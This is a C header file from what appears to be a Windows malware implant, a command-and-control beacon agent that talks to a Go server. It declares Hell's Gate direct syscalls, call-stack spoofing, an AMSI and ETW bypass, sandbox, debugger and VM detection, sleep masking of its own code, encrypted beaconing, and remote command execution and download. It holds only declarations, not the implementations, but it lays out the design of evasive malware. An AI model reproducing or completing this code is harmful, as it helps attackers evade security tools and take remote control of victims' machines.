#pragma once
#include "ntdefs.h"

/* ── Compile-time configuration pulled from generated config.h ───────────── */
#include "config.h"

/* ── Compiler helpers ─────────────────────────────────────────────────────── */
#ifdef _MSC_VER
  #include <intrin.h>
  #define READ_GS_QWORD(off) __readgsqword(off)
#else
  static __inline__ ULONG_PTR READ_GS_QWORD(ULONG_PTR off) {
      ULONG_PTR ret;
      __asm__ volatile("mov %%gs:(%1),%0" : "=r"(ret) : "r"(off));
      return ret;
  }
#endif

#define ARRAY_SIZE(a) (sizeof(a) / sizeof((a)[0]))
#define MIN(a,b) ((a) < (b) ? (a) : (b))
#define MAX(a,b) ((a) > (b) ? (a) : (b))

/* ── Crypto constants matching Go server crypto.Manager ──────────────────── */
#define AES_KEY_LEN     32      /* AES-256 */
#define GCM_NONCE_LEN   12
#define GCM_TAG_LEN     16
#define SHA256_LEN      32

/* ── String / buffer sizes ────────────────────────────────────────────────── */
#define UUID_STR_LEN        37   /* "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx\0" */
#define HOSTNAME_MAX        256
#define USERNAME_MAX        256
#define WORKDIR_MAX         512
#define CMD_OUTPUT_MAX      (256 * 1024)  /* 256 KB max shell output */
#define BEACON_BUF_MAX      (64  * 1024)  /* 64 KB beacon payload     */
#define RESP_BUF_MAX        (256 * 1024)  /* 256 KB response          */
#define PATH_MAX_C          1024

/* ── Beacon state ─────────────────────────────────────────────────────────── */
typedef struct {
    char   agent_id[UUID_STR_LEN];
    char   hostname[HOSTNAME_MAX];
    char   username[USERNAME_MAX];
    int    pid;
    int    is_admin;
    DWORD  interval_ms;     /* beacon interval with jitter applied */
    int    base_interval;   /* base interval seconds (from config) */
    int    jitter_pct;
    BOOL   sleep_mask;
    BOOL   evasion;
    BYTE   aes_key[AES_KEY_LEN];
} AgentState;

/* ── Command descriptor (parsed from server JSON) ────────────────────────── */
#define CMD_TYPE_LEN  32
#define CMD_ID_LEN    64
#define CMD_ARG_LEN   4096

typedef struct {
    char id[CMD_ID_LEN];
    char type[CMD_TYPE_LEN];
    char args_json[CMD_ARG_LEN];  /* raw args object JSON */
} AgentCommand;

/* ── Command result ───────────────────────────────────────────────────────── */
typedef struct {
    char  cmd_id[CMD_ID_LEN];
    char *output;     /* heap-allocated; caller frees */
    int   success;
    int   exit_code;
} AgentResult;

/* ── Global agent state (defined in entry.c) ─────────────────────────────── */
extern AgentState g_agent;

/* ── Hell's Gate globals (defined in hellsgate.c / syscall_stub.asm) ────── */
extern DWORD  g_ssn;
extern PVOID  g_gadget;
extern PVOID  g_k32_ret;   /* kernel32 "ret" gadget for call-stack spoofing */

/* ── BCrypt function pointers (defined in crypto.c) ─────────────────────── */
extern pfnBCryptOpenAlgorithmProvider    pBCryptOpenAlgorithmProvider;
extern pfnBCryptCloseAlgorithmProvider   pBCryptCloseAlgorithmProvider;
extern pfnBCryptSetProperty              pBCryptSetProperty;
extern pfnBCryptGenerateSymmetricKey     pBCryptGenerateSymmetricKey;
extern pfnBCryptDestroyKey               pBCryptDestroyKey;
extern pfnBCryptEncrypt                  pBCryptEncrypt;
extern pfnBCryptDecrypt                  pBCryptDecrypt;

/* ── WinHTTP function pointers (defined in beacon.c) ────────────────────── */
extern pfnWinHttpOpen              pWinHttpOpen;
extern pfnWinHttpConnect           pWinHttpConnect;
extern pfnWinHttpOpenRequest       pWinHttpOpenRequest;
extern pfnWinHttpSendRequest       pWinHttpSendRequest;
extern pfnWinHttpReceiveResponse   pWinHttpReceiveResponse;
extern pfnWinHttpQueryDataAvailable pWinHttpQueryDataAvailable;
extern pfnWinHttpReadData          pWinHttpReadData;
extern pfnWinHttpCloseHandle       pWinHttpCloseHandle;
extern pfnWinHttpSetOption         pWinHttpSetOption;

/* ── Function declarations ────────────────────────────────────────────────── */

/* hellsgate.c */
BOOL     HellsGateInit(void);
DWORD    HellsGateSSN(const char *funcName);
BOOL     HellsGateSetSSN(const char *funcName);

/* syscalls.c */
NTSTATUS NtAlloc(HANDLE hProc, PVOID *base, SIZE_T size, ULONG protect);
NTSTATUS NtFree(HANDLE hProc, PVOID base);
NTSTATUS NtWrite(HANDLE hProc, PVOID addr, PVOID data, SIZE_T size);
NTSTATUS NtProtect(HANDLE hProc, PVOID addr, SIZE_T size, ULONG newProt, ULONG *oldProt);
NTSTATUS NtCreateThread(HANDLE hProc, PVOID startAddr, PVOID param, HANDLE *hThread);
NTSTATUS NtOpenProc(DWORD pid, DWORD access, HANDLE *hOut);
NTSTATUS NtDelay(LONGLONG hundredNs);
NTSTATUS NtQueryProcInfo(HANDLE hProc, PROCESSINFOCLASS cls, PVOID buf, ULONG len, ULONG *retLen);
NTSTATUS NtOpenFile(NT_UNICODE_STRING *path, ULONG access, HANDLE *hOut);
NTSTATUS NtMapSection(HANDLE hFile, PVOID *baseOut, SIZE_T *viewSize);
NTSTATUS NtUnmap(PVOID base);

/* called by assembly stub — wraps HellsGateCall with arg setup */
NTSTATUS HellsGateCall(PVOID arg1, PVOID arg2, PVOID arg3, PVOID arg4,
                        PVOID arg5, PVOID arg6, PVOID arg7, PVOID arg8);

/* crypto.c */
BOOL CryptoInit(void);
void Sha256(const BYTE *data, SIZE_T len, BYTE out[SHA256_LEN]);
int  Base64Encode(const BYTE *in, int inLen, char *out, int outCap);
int  Base64Decode(const char *in, int inLen, BYTE *out, int outCap);
BOOL AesGcmEncrypt(const BYTE *key, const BYTE *nonce, const BYTE *pt, DWORD ptLen,
                   BYTE *ct, BYTE *tag);
BOOL AesGcmDecrypt(const BYTE *key, const BYTE *nonce, const BYTE *ct, DWORD ctLen,
                   const BYTE *tag, BYTE *pt);
/* Encrypt/decrypt matching Go crypto.Manager wire format */
char *ImplantEncrypt(const BYTE *data, DWORD dataLen);   /* returns heap-alloc string */
BYTE *ImplantDecrypt(const char *encoded, DWORD *outLen);/* returns heap-alloc buf */

/* utils.c */
void  GenUUID(const char *seed, char out[UUID_STR_LEN]);
DWORD RandDword(void);
void  RandBytes(BYTE *buf, DWORD len);
int   xsnprintf(char *buf, int cap, const char *fmt, ...);
int   JsonStr(char *buf, int cap, int pos, const char *key, const char *val);
int   JsonInt(char *buf, int cap, int pos, const char *key, int val);
int   JsonBool(char *buf, int cap, int pos, const char *key, int val);
int   JsonRaw(char *buf, int cap, int pos, const char *key, const char *raw);
char *JsonGetStr(const char *json, const char *key);   /* heap-alloc; caller frees */
char *JsonGetPath(const char *json, const char *path); /* dot-separated path */
void  WstrToStr(WCHAR *w, char *out, int outCap);
void  StrToWstr(const char *s, WCHAR *out, int outCap);
void *ImplantAlloc(SIZE_T n);
void  ImplantFree(void *p);
char *ImplantStrDup(const char *s);

/* evasion.c */
BOOL EvasionInit(void);   /* sets up AMSI + ETW HWBP bypass via VEH */
BOOL IsSandbox(void);
BOOL IsDebugged(void);
BOOL IsVM(void);

/* sleep_mask.c */
void SleepMasked(LONGLONG ms);  /* RC4-mask .text + PAGE_NOACCESS + sleep */

/* beacon.c */
BOOL BeaconInit(void);
BOOL BeaconSend(const AgentResult *lastResult, AgentCommand *cmdOut);

/* commands.c */
AgentResult *ExecuteCommand(const AgentCommand *cmd);
void         FreeResult(AgentResult *r);
char        *HttpPost_GET(const char *url, DWORD *outLen); /* used by dl command */
